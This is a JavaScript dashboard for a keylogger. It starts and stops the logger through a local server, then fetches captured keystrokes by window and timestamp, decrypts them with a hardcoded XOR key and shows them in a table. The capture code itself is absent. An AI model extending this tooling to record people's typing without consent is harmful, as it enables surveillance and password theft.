let isRunning = false;

async function toggleKeylogger() {
    const url = isRunning ? 'http://127.0.0.1:5000/stop' : 'http://127.0.0.1:5000/start';
    try {
        const response = await fetch(url);
        const result = await response.json();
        isRunning = !isRunning;
        const button = document.getElementById('toggleKeylogger');
        button.textContent = isRunning ? 'Stop' : 'Start';
        button.classList.toggle('stop', isRunning);
        const recordingIndicator = document.querySelector('.recording-indicator');
        recordingIndicator.style.display = isRunning ? 'flex' : 'none';
    } catch (error) {
        console.error('Error:', error);
        alert('Failed to toggle keylogger');
    }
}

async function fetchData() {
    try {
        const response = await fetch('http://127.0.0.1:5000/data');
        const data = await response.json();

        const rowData = data.flatMap(entry =>
            Object.entries(entry.timestamps).map(([timestamp, value]) => ({
                window: entry.window,
                timestamp: timestamp,
                logs: xorDecrypt(value)
            }))
        );

        const gridOptions = {
            columnDefs: [
                { headerName: 'Window', field: 'window', filter: 'agTextColumnFilter' },
                { headerName: 'Timestamp', field: 'timestamp', filter: 'agDateColumnFilter' },
                { headerName: 'Logs', field: 'logs', filter: 'agTextColumnFilter' }
            ],
            defaultColDef: {
                sortable: true,
                filter: true,
                resizable: true
            },
            rowData: rowData,
            pagination: true,
            paginationPageSize: 10,
            paginationPageSizeSelector: [10, 20, 50, 100],
            domLayout: 'autoHeight'
        };

        const eGridDiv = document.querySelector('#myGrid');
        agGrid.createGrid(eGridDiv, gridOptions);
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}

document.addEventListener('DOMContentLoaded', fetchData);

function xorDecrypt(hexText, key = "thisIsMyXorKey") {
    const text = hexToString(hexText);
    const keyCycle = key.repeat(Math.ceil(text.length / key.length)).slice(0, text.length);
    return text.split('').map((char, i) =>
        String.fromCharCode(char.charCodeAt(0) ^ keyCycle.charCodeAt(i))
    ).join('');
}

function hexToString(hex) {
    return hex.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
}
